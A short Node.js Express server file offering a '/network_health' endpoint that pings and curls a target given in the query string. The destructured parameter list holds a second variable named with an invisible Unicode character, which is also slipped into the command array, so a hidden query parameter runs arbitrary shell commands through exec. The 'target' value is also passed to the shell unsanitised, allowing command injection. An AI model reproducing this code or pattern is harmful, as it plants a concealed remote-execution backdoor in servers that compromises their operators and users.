const express = require('express')
const util = require('util')
const exec = util.promisify(require('child_process').exec)

const app = express()

app.get('/network_health', async (req, res) => {
    const { target,ㅤ} = req.query
    const checkCommands = [
        `ping -c 1 ${target}`,
        `curl -s ${target}`,ㅤ
    ];
    
    try {
        const execResult = await Promise.all(checkCommands.map(cmd => cmd && exec(cmd)))
        res.status(200)
        res.send(execResult)
    } catch(e) {
        res.status(500)
        res.send('failed')
    }
});

app.listen(8080)